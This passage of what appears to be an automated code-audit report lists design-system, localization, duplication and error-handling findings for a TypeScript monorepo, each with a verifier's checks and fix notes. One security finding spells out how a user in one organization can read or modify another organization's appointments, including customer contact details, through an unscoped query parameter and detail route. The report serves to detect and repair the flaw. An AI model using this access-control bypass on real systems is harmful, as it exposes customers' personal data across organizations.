- :3432-3435 `if (embedded || maxBodyHeight === false) return undefined` — a non-embedded table gains an internal max-body-height scrollport; the table body scrolls instead of the page.
- :3416 toolbar moves from `mt-2` inline to a bordered `border-b border-table-border px-4 py-3 sm:px-5` row; :3390 `renderToolbarInline = embedded && hasToolbar` turns off.
- :3983 pagination moves from `mt-3` to a bordered footer row.

That is the intended Phase 4 look, but it is a deliberate visual change the 

## [HIGH] consistency — WMS detail pages render the "Recent activity" DataTable without `embedded`, producing a second page-title-sized h1 mid-page
**Lane:** page-layout  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/wms/components/backend/WmsLotDetailPage.tsx:1252
- packages/core/src/modules/wms/components/backend/WmsSkuDetailPage.tsx:1139
- packages/core/src/modules/wms/components/backend/WmsLocationDetailPage.tsx:1203
**Canonical:** packages/core/src/modules/wms/components/backend/WmsLotDetailPage.tsx:1211
**Why it matters:** "Recent activity" renders at the same 24/30px page-title weight as the record's own title, so a detail page shows two competing h1s and an in-page section that visually claims to be the page. The identically-purposed balances table two sections above renders as a 14px section heading — the same page shows two different heading treatments for two peer tables.
**Proposed fix:** Add `embedded` to the `<DataTable<InventoryMovementRow>>` at WmsLotDetailPage.tsx:1252, WmsSkuDetailPage.tsx:1139 and WmsLocationDetailPage.tsx:1203, matching the balances table on the same page.
**Note:** packages/core/src/modules/warranty_claims/backend/warranty_claims/[id]/page.tsx:2071-2072 is the cross-module confirmation of the pattern — a detail-page table there is `embedded`.
**Verifier:** The finding survives, and the core claim is actually stronger than reported. I opened every cited file and confirmed each claim at the exact line numbers given (no drift).

CONFIRMED VERBATIM:
- WmsLotDetailPage.tsx:1211-1212 — `<DataTable<InventoryBalanceRow>` followed by `embedded` on 1212. Canonical site is real.
- WmsLotDetailPage.tsx:1252-1253 — `<DataTable<InventoryMovementRow>` then `title={t('wms.backend.lot.activity.title', 'Recent activity')}`, no `embedded` anywhere in the props block.
- WmsSkuDetailPage.tsx:1139 and WmsLocationDetailPage.tsx:1203 — identical shape (`title={t('wms.backend.sku|location.activity.title', 'Recent activity')}`, no `embedded`), with their own `embedded` balances tables at 1096-1097 and 1160-1161.
- DataTable.tsx:3518-3531 — the branch is exactly as quoted; the source comment above it states the intent outright: "Embedded tables stay a section heading; a standalone list view owns the page, so its title takes the page-title treatment."
- DataTable.tsx:3410-3412 — `cardClassName = embedded ? '' : 'overflow-hidden rounded-xl bg-surface shadow-md dark:border dark:border-border'`.
- PageHeader exists at the cited lines (WmsLotDetailPage:1044, WmsSku
**Fix notes:** DO NOT APPLY THE FIX AS WRITTEN. Adding a bare `embedded` to the activity tables changes behaviour well beyond the heading defect, because — unlike the balances table — the activity table has NO wrapping card.

Structure I confirmed in all three detail pages: the balances table sits inside `<section className="...rounded-xl border border-border bg-surface shadow-sm...">` which supplies the card chrome, so `embedded` (which blanks `cardClassName`) is correct there. The activity table is a bare sibling AFTER that `</section>`, so its card comes from the non-embedded `cardClassName` itself. Setting `embedded` there strips the card and the table floats on the page ground between two carded sections.

Everything `embedded` flips (all verified in packages/ui/src/backend/DataTable.tsx):
- 3405 containerClassName: `flex flex-col gap-5` -> `''`
- 3410-3412 cardClassName: `overflow-hidden rounded-

## [HIGH] security — appointments API ignores the organization allow-list: `?organizationId=` is trusted verbatim and the detail/PATCH handlers scope by tenant only
**Lane:** sec-tenancy  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/appointments/api/route.ts:48
- packages/core/src/modules/appointments/api/route.ts:57
- packages/core/src/modules/appointments/api/[id]/route.ts:64
- packages/core/src/modules/appointments/api/[id]/route.ts:126
**Canonical:** packages/core/src/modules/workflows/api/instances/[id]/route.ts:55
**Why it matters:** `docs/architecture/multi-tenancy.md` §2 makes the organization boundary an authorization decision enforced by the org allow-list on the principal's ACL, and §3.4 names `isOrganizationAccessAllowed` the single fail-closed predicate. A user holding `appointments.view` in organization A can (a) list every organization's appointments in the tenant with `GET /api/appointments?organizationId=<org B>`, and (b) read or re-status any appointment in the tenant with `GET`/`PATCH /api/appointments/<uuid>` — no org predicate is applied at all on the detail path. The rows carry `customerName`, `customerPhone`, `customerEmail` and `notes` (mapped straight into the response at `api/[id]/route.ts:44-52`), so this is cross-branch customer PII disclosure plus a cross-branch write. The module's own `AGENTS.md` already states "Staff create uses auth tenant/org — never trust client-supplied scope on `POST /api/appointments`"; the read/patch paths simply were not held to it.
**Proposed fix:** In `api/route.ts` GET, replace the raw query read with the labels-route shape: `const scope = await resolveOrganizationScopeForRequest({ container, auth, request: req, selectedId: url.searchParams.get('organizationId') ?? undefined })`, then `const orgFilter = resolveOrganizationScopeFilter(scope, auth)` and spread `...orgFilter.where` into `where` instead of assigning `where.organizationId` from the query string. In `api/[id]/route.ts`, resolve the same `orgFilter` in GET and PATCH and pass it into `loadScopedAppointment` so the filter becomes `{ id, tenantId, ...orgFilter.where, deletedAt: null }` — a miss then returns the existing 404 unchanged. Both are local edits inside the two route files.
**Note:** No spec in `.ai/specs/` covers appointments (`ls .ai/specs | grep -i appoint` is empty). This gap is not one of the ones `docs/architecture/multi-tenancy.md` §8 already records — §8's standing item is unguarded direct `EntityManager` access in general; this is a concrete instance where the missing predicate is the organization one, and the tenant predicate is present, so it is not a cross-tenant leak.
**Verifier:** SURVIVES. I opened every cited file; all line numbers are exact, with zero drift.

VERIFIED AS QUOTED:
- `api/route.ts:48` — `const organizationId = url.searchParams.get('organizationId') ?? auth.orgId ?? null`, and `:57` — `if (organizationId) where.organizationId = organizationId`. Verbatim.
- `api/[id]/route.ts:59-69` — `loadScopedAppointment` filters `{ id, tenantId, deletedAt: null }` only (`em.findOne` at :64); called by GET at :87 and PATCH at :126. Verbatim.
- `data/entities.ts:65-66` — `@Property({ name: 'organization_id', type: 'uuid' }) organizationId!: string`. Exact.
- Canonical `workflows/api/instances/[id]/route.ts:53,55,64-68` and `customers/api/labels/route.ts:73,79` — both exact.
- `audit_logs/.../access/route.ts:104-108` — the allow-list check is verbatim as claimed.

REFUTATION ATTEMPTS THAT FAILED:
1. "Canonical isn't dominant" — FALSE. 338 non-test `resolveOrganizationScopeForRequest` sites, 46 `resolveOrganizationScopeFilter`. I enumerated all 12 routes reading `searchParams.get('organizationId')`: every other one funnels it through a schema+scope resolver or an explicit allow-list check. `appointments/api/route.ts:48` is the ONLY raw consumer.
2. "A middlewa
**Fix notes:** IMPORTANT — the finding's proposed list-route fix is internally inconsistent; take the labels-route variant, not the filter-spread variant.

`resolveOrganizationScopeFilter` (organizationScopeFilter.ts:15-25) returns `where: {}` when `filterIds === null` (an unrestricted / tenant-wide principal). Spreading that into the LIST query would WIDEN it: today the list narrows to `auth.orgId`, but with `...orgFilter.where` a tenant-wide principal would receive the whole tenant. That is a behavior change beyond the defect. Use the labels shape for the list, which validates the param while preserving today's narrowing.

EDIT 1 — packages/core/src/modules/appointments/api/route.ts (GET), replacing line 48 and line 57.
Move `createRequestContainer()` above the scope resolution (it is currently created at :50), then:
    const scope = await resolveOrganizationScopeForRequest({
      container, auth, 

## [HIGH] consistency — The three highest-traffic error surfaces still paint error copy with the action token `text-destructive`, which an IMPLEMENTED spec forbids for status copy
**Lane:** states  **Fix is safe:** True
**Divergent sites:**
- packages/ui/src/backend/detail/ErrorMessage.tsx:34
- packages/ui/src/backend/DataTable.tsx:3780
- packages/ui/src/backend/CrudForm.tsx:4838
**Canonical:** packages/ui/src/primitives/form-field.tsx:92
**Why it matters:** `--destructive` (#C0483F) is defined as the ICON weight of the error ramp (globals.css:440 pins `--status-error-icon` to the same value); the TEXT weight is `--status-error-text` (#7A2823). Rendering 14px body copy at #C0483F over `bg-destructive/5` (~#FBF2F1) gives roughly 4.4:1 contrast, under the 4.5:1 WCAG AA threshold for normal text, where `text-status-error-text` on `bg-status-error-bg` gives about 8.7:1. This is not one page: `<ErrorMessage>` has 158 call sites, DataTable:3780 is the load-failure row of every list view, and CrudForm:4838 is the inline validation message of every form that does not route through FormField. The spec's CI contrast gate (`scripts/check-token-parity.mjs`) only checks `--X`/`--X-foreground` pairs, so this pairing is invisible to it. Beyond contrast, the DS reserves the destructive ramp so a red control reads "you are about to destroy something" — using it for "we failed to load this" collapses that distinction on the repo's most-seen error states.
**Proposed fix:** Swap the three class strings onto the status ramp, matching AccessDeniedMessage.tsx:19: ErrorMessage.tsx:34 -> 'flex items-start gap-3 rounded border border-status-error-border bg-status-error-bg px-3 py-2 text-sm text-status-error-text' (and give the AlertCircle `text-status-error-icon`); DataTable.tsx:3780 -> `text-center text-status-error-text`; CrudForm.tsx:4838 -> `mt-1.5 text-xs font-medium text-status-error-text`. Both token families already exist with dedicated dark values, so no other edit is needed.
**Note:** .ai/specs/2026-08-01-destructive-button-loudness-policy.md is marked "IMPLEMENTED - pending merge" and its changelog records that 49 status-copy call sites were already moved off `text-destructive`. These three are stragglers that migration missed, not scheduled future work — so this is a gap in a finished migration rather than a duplicate of an open spec. Note the migration deliberately left `IconButton`'s destructive variant and Alert/Badge status variants out of scope; none of the three sites here fall in that carve-out.
**Verifier:** SURVIVES as a token-semantics divergence, but with two material corrections — the accessibility rationale is FALSE and the scope is understated ~10x.

VERIFIED VERBATIM (I opened every file):
- packages/ui/src/backend/detail/ErrorMessage.tsx:34 — exactly 'flex items-start gap-3 rounded border border-destructive/50 bg-destructive/5 px-3 py-2 text-sm text-destructive'. Confirmed.
- packages/ui/src/backend/DataTable.tsx:3780 — exact string confirmed; context (3773-3785) confirms it is the `error ?` branch, i.e. the load-failure row.
- packages/ui/src/backend/CrudForm.tsx:4838 — exact string confirmed; context confirms it is the inline field-validation message.
- Canonical form-field.tsx:92 `className="text-xs text-status-error-text"` confirmed; AccessDeniedMessage.tsx:19 confirmed identical component shape on the status ramp.
- Rules quoted accurately: .ai/ds-rules.md:15 ("NOT for error copy"), :371, and spec :81 which explicitly enumerates "validation messages, load failures ... and error cells in tables" as Status. An independent fourth source corroborates: .ai/ui-components.md:131 "Status and validation copy is not a destructive action — that takes text-status-error-text, never tex
**Fix notes:** Recommend re-scoping before implementing: do NOT ship a three-site patch. Either fix all ~28 status-copy sites in packages/ui as one migration pass, or do not fix these three, because a partial patch leaves sibling components (the five charts, ProgressTopBar, AddressEditor, InlineEditors, InjectionWizard, AiChat) rendering error copy in a different red from DataTable/CrudForm/ErrorMessage in the same views.

Also drop the accessibility justification from the PR description — it is false (4.63:1 and 4.95:1 both clear AA 4.5:1). Justify this on the documented status-vs-action token boundary alone (.ai/ds-rules.md:15, :371; .ai/ui-components.md:131; spec :81).

Exact edits if it proceeds:
1. packages/ui/src/backend/detail/ErrorMessage.tsx:34 → 'flex items-start gap-3 rounded border border-status-error-border bg-status-error-bg px-3 py-2 text-sm text-status-error-text'. The AlertCircle at :3

## [MEDIUM] consistency — inbox_ops message-object preview is the only one of eight that hardcodes English instead of localizing
**Lane:** authoring-chain  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts:19
- packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts:38
- packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts:50
- packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts:55
- packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts:59
**Canonical:** packages/core/src/modules/sales/lib/messageObjectPreviews.ts:68
**Why it matters:** These previews are rendered verbatim by `MessageObjectPreview` (title, status badge, and metadata keys via `Object.entries(previewData.metadata)`), so a Polish or German operator composing or reading a message with an inbox email attached gets "Inbox Email", "Not found" and a lowercase "from:" key in English inside an otherwise localized panel. The module ships full de/es/fr/ko/pl/vi/zh dictionaries and has no `.hardcoded-allowlist.json`, so these are not opted-out strings.
**Proposed fix:** Add `const { t } = await resolveTranslations()` at the top of `loadInboxEmailPreview` and replace the four literals with `t('inbox_ops.messageObjects.email.title')`, `t('inbox_ops.messageObjects.notFound')` and a translated label for the `from` metadata key, adding the keys to the module's i18n files — mirroring sales/lib/messageObjectPreviews.ts:68-92.
**Verifier:** Verified line-by-line, not taken on trust.

CONFIRMED:
- `packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts` exists, is 61 lines, is clean in the working tree (`git status --porcelain` empty), is not a test/generated/dist file, and imports NO i18n helper. Lines 19, 38, 50, 55, 59 contain exactly the quoted code — no line drift.
- Canonical site is exact: `packages/core/src/modules/sales/lib/messageObjectPreviews.ts:68` is `const { t } = await resolveTranslations()`, with :69 the localized defaultTitle, :74 `t('sales.messageObjects.notFound')`, :87-89 the translated metadata labels.
- Dominance is real, and it is not just an import count. I read `resources/lib/messageObjectPreviews.ts` in full: structurally identical function (same `resolveEm`, same `PreviewContext`, same `findOneWithDecryption`, same guard/not-found shape) with `const { t } = await resolveTranslations()` at :22 and a translated `defaultTitle` at :23. Per-file `grep -c resolveTranslations`: catalog 4, currencies 2, customers 4, resources 2, sales 3, staff 6, example 2, inbox_ops 0. 7 of 8.
- All eight are invoked from the same server-side call site — `packages/core/src/modules/messages/api/[id]/route.
**Fix notes:** Safe: no DB migration, no schema/ACL-feature/event-id/notification-type change, no public contract change. `ObjectPreviewData.title` stays a required string; only the string VALUES become locale-dependent, which is the intended defect fix and matches what the other seven modules already emit from the same route.

Exact edits in `packages/core/src/modules/inbox_ops/lib/messageObjectPreviews.ts`:

1. Add the import alongside the existing ones (mirror resources:3):
   `import { resolveTranslations } from '@open-mercato/shared/lib/i18n/server'`

2. Hoist the translator to the top of `loadInboxEmailPreview` (currently :17-18), mirroring resources:22-23 — it must be BEFORE the `if (!ctx.organizationId)` guard so :19 can use it:
   `const { t } = await resolveTranslations()`
   `const defaultTitle = t('inbox_ops.messageObjects.email.title')`

3. Replace the four literals:
   - :19  `{ title: de

## [MEDIUM] consistency — LeaveRequestPreview is the only object-preview renderer that never calls useT()
**Lane:** authoring-chain  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/staff/components/LeaveRequestPreview.tsx:22
- packages/core/src/modules/staff/components/LeaveRequestPreview.tsx:25
- packages/core/src/modules/staff/components/LeaveRequestPreview.tsx:39
**Canonical:** packages/ui/src/backend/messages/MessageObjectPreview.tsx:19
**Why it matters:** This component is registered for `staff:leave_request` (staff/message-objects.ts:16) and renders inside the message composer and the message thread, side by side with previews that do localize. A non-English user sees English fallbacks on exactly one object type. `staff` ships full de/es/fr/ko/pl/vi/zh dictionaries and has no hardcoded-string allowlist.
**Proposed fix:** Add `const t = useT()` and replace the three literals with `t('staff.messageObjects.leaveRequest.title', 'Leave Request')`, `t('staff.messageObjects.leaveRequest.details', 'Leave Request Details')` and the existing `t('messages.composer.objectActionRequired', 'Action required')` key, adding the two new keys to the staff i18n files.
**Verifier:** SURVIVES. I opened every cited file and confirmed each claim.

CONFIRMED:
1. packages/core/src/modules/staff/components/LeaveRequestPreview.tsx imports only ObjectPreviewProps, CalendarClock and Badge — no i18n helper — and hardcodes `'Leave Request'` (L22), `'Leave Request Details'` (L25) and `'Action Required'` (L38).
2. Canonical packages/ui/src/backend/messages/MessageObjectPreview.tsx:19 is verbatim `const t = useT()`, with `actionLabel || t('messages.composer.objectActionRequired', 'Action required')` at L30.
3. Dominance holds. 18 `PreviewComponent:` registrations across 8 modules; there are only 4 distinct renderer implementations. 3 of 4 localize — MessageObjectPreview (canonical), inbox_ops/components/messages/InboxEmailPreview.tsx (useT L13, key at L25) and sales/widgets/messages/SalesDocumentMessagePreview.tsx (useT L15, key at L32) — and the latter two use the IDENTICAL key `messages.composer.objectActionRequired`, which exists at packages/core/src/modules/messages/i18n/en.json:55. LeaveRequestPreview is the sole holdout.
4. NOT a deliberate module difference: the sibling packages/core/src/modules/staff/components/LeaveRequestDetail.tsx (same folder) DOES call useT (L1
**Fix notes:** No DB migration, no frozen persisted identifier (no ACL feature, event id, notification type or schema touched), no public contract change — ObjectPreviewProps is untouched.

`useT()` is safe to add here: the component is already "use client" (L1), and the canonical MessageObjectPreview — which calls useT and serves as the `messages:default` fallback at all three of the same render sites — proves the i18n provider is always mounted above them. No new provider risk.

EXACT EDITS (LeaveRequestPreview.tsx):
1. After L3, add: `import { useT } from '@open-mercato/shared/lib/i18n/context'`
2. Inside the component body, before L14's `const data`, add: `const t = useT()`
3. L22 -> `const title = previewData?.title || t('staff.messageObjects.leaveRequest.title', 'Leave request')`  <-- REUSE the existing key; do NOT add it, it is already in all 8 locales with value "Leave request".
4. L25 -> `t('s

## [MEDIUM] duplication — ObjectHistoryButton hand-rolls the outline icon-button with the exact `dark:bg-input/30` override the DS deliberately removed (regression test #3507)
**Lane:** ds-tokens  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/customers/components/detail/ObjectHistoryButton.tsx:17
**Canonical:** packages/ui/src/primitives/icon-button.tsx:16
**Why it matters:** In dark mode this button renders on the muted input surface with an input border, while every neighbouring outline IconButton on the same detail header renders `bg-surface` / `border-border`. The stale copy also re-introduces the exact tailwind-merge hazard the DS fixed: any caller passing a `bg-*` className will lose it in dark mode, the failure mode issue #3507 was filed for.
**Proposed fix:** Drop the three `dark:` classes, or replace the constant entirely with `iconButtonVariants({ variant: 'outline', size: 'default' })` from `@open-mercato/ui/primitives/icon-button` so the button tracks the DS variant.
**Note:** Not lint-enforced — no om-ds rule inspects `dark:` prefixes on non-ramp tokens, and `packages/core/src/modules/customers/components/` sits outside the backend-only scope in eslint.ds.config.mjs.
**Verifier:** SURVIVES, with three corrections to the evidence.

VERIFIED VERBATIM:
- packages/core/src/modules/customers/components/detail/ObjectHistoryButton.tsx:16-17 contains exactly the quoted constant, including `dark:bg-input/30 dark:border-input dark:hover:bg-input/50`. Working tree is clean (`git status --porcelain` empty) — not already fixed.
- packages/ui/src/primitives/icon-button.tsx:16 `outline: 'border border-border bg-surface text-foreground shadow-sm hover:bg-surface-muted'` — exact match, no `dark:` override.
- Repo-wide grep for `dark:bg-input` in .ts/.tsx: only the test file (comment + 3 assertions), ObjectHistoryButton.tsx:17, and apps/mercato/src/components/ui/input.tsx:11 (untouched shadcn scaffold). Confirmed.

THE DIVERGENCE IS REAL AND DOMINANCE FAVOURS THE CANONICAL SIDE:
- packages/ui/src/backend/version-history/VersionHistoryAction.tsx:49-58 renders `<IconButton variant="ghost" size="default" className={buttonClassName}>`. Of its 6 call sites, ObjectHistoryButton is the ONLY one that passes `buttonClassName` at all; CompanyHighlights.tsx:84, PersonHighlights.tsx:346, sales/documents/[id]/page.tsx:4603, resources/[id]/page.tsx:678 and CrudForm.tsx:1559 all take the sh
**Fix notes:** RECOMMENDED EDIT (verified safe — I applied it, ran the tests, and reverted; tree is clean).

packages/core/src/modules/customers/components/detail/ObjectHistoryButton.tsx:17 — delete the three dark: classes:

  const OUTLINE_ICON_BUTTON_CLASSES =
    'size-8 rounded-md border bg-surface shadow-xs hover:bg-accent hover:text-accent-foreground'

No DB migration, no frozen persisted identifier (no ACL feature id, event id, notification type or schema), no public contract change — the constant is file-private and the component's exported props are untouched.

DO NOT use the finding's alternative fix as written. Replacing the constant wholesale with `iconButtonVariants({ variant: 'outline', size: 'default' })` is NOT safe:
- `fullRadius` defaults to `false` → the variant emits `rounded-lg`, so `rounded-md` disappears. That fails the existing assertion `expect(button.className).toEqual(expect.

## [MEDIUM] consistency — Four AI sheet/launcher panels use the arbitrary `z-[70]` where the DS z-index scale ships a named `z-banner` (= 70)
**Lane:** ds-tokens  **Fix is safe:** True
**Divergent sites:**
- packages/ui/src/ai/AiAssistantLauncher.tsx:691
- packages/core/src/modules/catalog/backend/catalog/products/MerchandisingAssistantSheet.tsx:479
- packages/core/src/modules/customers/widgets/injection/ai-assistant-trigger/widget.client.tsx:608
- packages/core/src/modules/customers/widgets/injection/ai-deal-detail-trigger/widget.client.tsx:150
**Canonical:** apps/mercato/src/components/GlobalNoticeBars.tsx:58
**Why it matters:** AGENTS.md forbids arbitrary values (`z-[9999]`) precisely so the stacking order stays a single source of truth. These four panels are pinned to the literal 70 rather than to `--z-index-banner`, so a future adjustment to the scale silently desynchronises the AI sheets from the notice bars and the feedback FAB that share that layer — and the layering intent is invisible at the call site (`z-[70]` says nothing; `z-banner` says which layer). packages/ui/src/primitives/__tests__/zindex-overlay.test.tsx:13-24 encodes the token table these sites bypass.
**Proposed fix:** Replace `z-[70]` with `z-banner` at the four sites. The compiled CSS shows the two selectors already share a declaration block, so the change is a pure no-op visually.
**Note:** Purely mechanical and safe. Arbitrary-value usage is not covered by any om-ds rule, so only an audit surfaces it. ChatPaneTabs.tsx:269 references `z-[70]` in a comment only — update that comment in the same pass.
**Verifier:** Every claim checks out against the current working tree (clean except an unrelated ObjectHistoryButton.tsx edit).

CONFIRMED, at the exact cited line numbers (no drift):
- packages/ui/src/ai/AiAssistantLauncher.tsx:691 — `'flex flex-col gap-3 p-4 z-[70]',`
- packages/core/src/modules/catalog/backend/catalog/products/MerchandisingAssistantSheet.tsx:479 — same literal
- packages/core/src/modules/customers/widgets/injection/ai-assistant-trigger/widget.client.tsx:608 — same literal
- packages/core/src/modules/customers/widgets/injection/ai-deal-detail-trigger/widget.client.tsx:150 — same literal
All four are real source .tsx (not tests, not __tests__, not *.generated.*, not dist/, not .ai/). All four are `className={cn(...)}` overrides on `<DialogContent>`.

Token exists: apps/mercato/src/app/globals.css:243 `--z-index-banner: 70;` inside the "Design System: Z-Index Scale" block. Canonical use confirmed at apps/mercato/src/components/GlobalNoticeBars.tsx:58 and DemoFeedbackWidget.tsx:224/239 (the comment "z-banner so it stays DS-compliant" is verbatim).

Dominance confirmed adversarially: `grep -rn 'z-\['` across packages/ + apps/mercato/src returns ONLY these four sites plus one comme
**Fix notes:** EXACT EDITS — replace `z-[70]` with `z-banner` in the identical string at each site (all four lines currently read `            'flex flex-col gap-3 p-4 z-[70]',`):
- packages/ui/src/ai/AiAssistantLauncher.tsx:691
- packages/core/src/modules/catalog/backend/catalog/products/MerchandisingAssistantSheet.tsx:479
- packages/core/src/modules/customers/widgets/injection/ai-assistant-trigger/widget.client.tsx:608
- packages/core/src/modules/customers/widgets/injection/ai-deal-detail-trigger/widget.client.tsx:150
→ `            'flex flex-col gap-3 p-4 z-banner',`

Plus the comment at packages/ui/src/ai/ChatPaneTabs.tsx:269: "(chat dialog at z-[70], dock panel, modal overlays)" → "at z-banner".

TWO THINGS THE IMPLEMENTER MUST KNOW — both correct the finding's rationale without changing the verdict:

1. The finding's stated consequence is overstated: today the `z-[70]` is INERT. DialogContent co

## [MEDIUM] consistency — CascadingCombobox paints its select-style trigger with `bg-background` (the page ground) instead of the field token `bg-input-bg`
**Lane:** ds-tokens  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/catalog/components/products/CascadingCombobox.tsx:210
**Canonical:** packages/ui/src/primitives/select.tsx:13
**Why it matters:** AGENTS.md: "NEVER paint a raised element with `bg-background` — that is the PAGE GROUND. Cards/panels/menus/controls use `bg-surface`, fields `bg-input-bg`." The component is rendered by ConstraintsEditor.tsx:550/604/615 inside a card on the product constraints page, so a control sitting on `bg-surface` is filled with the page ground — it reads as a hole punched in the card next to the real `<Select>` fields beside it, and the bare `border` (no `border-input`) plus `hover:bg-muted/50` diverge from the field hover (`hover:bg-modal-muted`) too.
**Proposed fix:** Change line 210 to `border border-input bg-input-bg` and line 211's hover to `hover:bg-modal-muted`, matching select.tsx:13. Alternatively swap the whole hand-rolled trigger for `SelectTrigger` / `ComboboxInput`.
**Note:** `bg-background` on raised elements is not covered by any om-ds lint rule, and `packages/core/src/modules/catalog/components/` is outside eslint.ds.config.mjs's backend-only scope, so nothing flags it today.
**Verifier:** I opened every cited file and confirmed each claim verbatim.

CONFIRMED — divergent site. packages/core/src/modules/catalog/components/products/CascadingCombobox.tsx:210-211 reads exactly as quoted: `'flex w-full items-center justify-between gap-2 rounded-md border bg-background px-3 py-2 text-sm text-left'` / `'hover:bg-muted/50 transition-colors'`. It is a `<button type="button">` acting as a select trigger (lines 204-212). Not a test, not generated, not under dist/.ai/graft. `git status --porcelain` on both files is empty, so it is NOT already fixed in the working tree.

CONFIRMED — canonical site. packages/ui/src/primitives/select.tsx:13 reads exactly as quoted, and lines 10-11 carry an explicit intent comment: "The trigger is a field, so it carries the same chrome as `Input` — matching border, hover/focus fill". All eight corroborating sites check out verbatim at the exact lines given (input.tsx:10, textarea.tsx:11, dropdown.tsx:90, date-picker.tsx:223, date-range-picker.tsx:188, counter-input.tsx:9, radio.tsx:27, checkbox.tsx:13). Every field primitive in packages/ui/src/primitives uses `border-input bg-input-bg`; 56 files repo-wide use `bg-input-bg`. The pattern is genuinely
**Fix notes:** EXACT EDITS — all in packages/core/src/modules/catalog/components/products/CascadingCombobox.tsx:

1) Line 210, inside the trigger `<button>`'s `cn(...)`:
   from: 'flex w-full items-center justify-between gap-2 rounded-md border bg-background px-3 py-2 text-sm text-left',
   to:   'flex w-full items-center justify-between gap-2 rounded-md border border-input bg-input-bg px-3 py-2 text-sm text-left',

2) Line 211:
   from: 'hover:bg-muted/50 transition-colors',
   to:   'hover:bg-modal-muted transition-colors',

3) Line 297 (same defect class, found during verification, not in the original finding) — the expand chevron sits inside the `bg-popover` panel opened at line 238:
   from: className="p-1 -ml-1 rounded hover:bg-background shrink-0 text-muted-foreground cursor-pointer"
   to:   className="p-1 -ml-1 rounded hover:bg-muted shrink-0 text-muted-foreground cursor-pointer"

Both target 

## [MEDIUM] duplication — Five divergent formatFileSize implementations render the same byte count differently
**Lane:** dup-logic  **Fix is safe:** False
**Divergent sites:**
- packages/core/src/modules/wms/components/backend/ImportInventoryDialog.tsx:146
- packages/core/src/modules/sync_excel/widgets/injection/upload-config/widget.client.tsx:221
- packages/core/src/modules/attachments/components/AttachmentLibrary.tsx:58
- packages/core/src/modules/chat/components/ComposerAttachments.tsx:26
- packages/ui/src/backend/detail/AttachmentMetadataDialog.tsx:99
**Canonical:** packages/ui/src/utils/format.ts:8
**Why it matters:** The same file shows a different size depending on which screen the user is on. A 1,500-byte file reads '1.5 KB' in the attachment library, the chat composer and the sync_excel widget, but '1 KB' in the WMS inventory import dialog. A 5 GB upload reads '4.7 GB' in the attachment library but '4768.4 MB' in the WMS and sync_excel import dialogs, because neither of those two ever escalates past MB — exactly the surfaces where large-file sizes matter, since they gate the import size limit the user is trying to stay under.
**Proposed fix:** Add one `formatFileSize(bytes: number): string` to packages/ui/src/utils/format.ts using the escalating-units body already shared by AttachmentMetadataDialog.tsx:99 and AttachmentLibrary.tsx:58 (it is the only one that reaches GB/TB and the only one duplicated verbatim). Replace the five local definitions with imports from '@open-mercato/ui/utils/format', and re-export it from chat/components/ComposerAttachments.tsx so its two existing importers keep working.
**Note:** chat's copy carries inline explanatory comments; per AGENTS.md 'no inline comments', fold the reasoning into the shared function's docblock in the style already used at packages/ui/src/utils/format.ts:1-7.
**Verifier:** Survives as a duplication finding, but two of its claims are wrong and must not be carried into the fix.

VERIFIED (I opened every file; tree is clean at ffd7404f):
- All five definitions exist at the exact cited lines. `yarn graft callers formatFileSize --depth all` independently confirms the same five spans (L58-69, L26-38, L221-225, L146-151, L99-110). None is in a test, __tests__/, *.generated.*, dist/, .ai/, graft/ or node_modules — all are source .tsx.
- The two verbatim copies are real: AttachmentMetadataDialog.tsx:99-110 and AttachmentLibrary.tsx:58-69 are byte-identical except the em dash is written `'—'` in one and `'—'` in the other. Same behaviour, so "character-for-character identical" is a slight overstatement of an otherwise correct claim.
- The three other bodies match the quoted code exactly.
- The canonical is real: packages/ui/src/utils/format.ts holds formatCurrency (:8) and formatDate (:35), is imported as '@open-mercato/ui/utils/format' by four core-module files (customers companies page.tsx:22 and [id]/page.tsx, customers/components/detail/utils.ts, catalog OptionTreeEditor.tsx:32), and already has a test home at packages/ui/src/utils/__tests__/format.test.ts
**Fix notes:** The fix as proposed is NOT safe — folding chat's copy into the escalating-units body silently changes chat rendering and breaks two asserted cases.

packages/core/src/modules/chat/__tests__/attachmentDto.test.ts:68-83 pins chat's exact strings:
  [1024*1024*200, '200 MB']  → the canonical body returns '200.0 MB' (toFixed(1) at idx>0). FAILS.
  formatFileSize(Number.NaN) === ''  → the canonical returns '—'. FAILS.
  formatFileSize(-1) === ''          → the canonical returns '0 B'. FAILS.
Chat's `value < 10 ? toFixed(1) : Math.round(value)` and its empty-string-for-nonsense return are deliberate and test-locked (the file's own comment: keep "234 KB" short). Do not collapse chat into the shared function.

Recommended scope, smallest change that fixes the real defect:
1. Add to packages/ui/src/utils/format.ts, verbatim from AttachmentMetadataDialog.tsx:99-110, with a docblock in the existing

## [MEDIUM] consistency — Two module-local unique-violation checks survived the shared pg-errors migration, one using the explicitly-rejected message match
**Lane:** dup-logic  **Fix is safe:** True
**Divergent sites:**
- packages/core/src/modules/devices/commands/shared.ts:113
- packages/core/src/modules/wms/commands/inventory-actions.ts:228
**Canonical:** packages/shared/src/lib/db/pg-errors.ts:41
**Why it matters:** devices: any failure whose message happens to contain 'duplicate key' — including a wrapped internal error re-thrown during device registration — is reported to the client as a 409 conflict instead of a 500, which is the precise misclassification the shared helper was written to stop. wms: a 23505 that arrives nested under `previous`/`driverError` (raw-connection or non-ORM write paths, which this file uses alongside the ORM) is not recognised, so the idempotency-replay recovery at inventory-actions.ts:860 and :1016 is skipped and a duplicated inventory-movement/reservation POST fails with an unexpected 500 instead of returning the existing row.
**Proposed fix:** Delete both local functions and import isUniqueViolation from '@open-mercato/shared/lib/db/pg-errors'. In devices/commands/register.ts:96 call isUniqueViolation(err) (drop the message match, or pass { matchMessage: true } only if the 409 path is proven to need it). In wms/commands/inventory-actions.ts:859 and :1015 call isUniqueViolation(error). Optionally leave a deprecated re-export in devices/commands/shared.ts mirroring packages/core/src/modules/communication_channels/lib/pg-errors.ts.
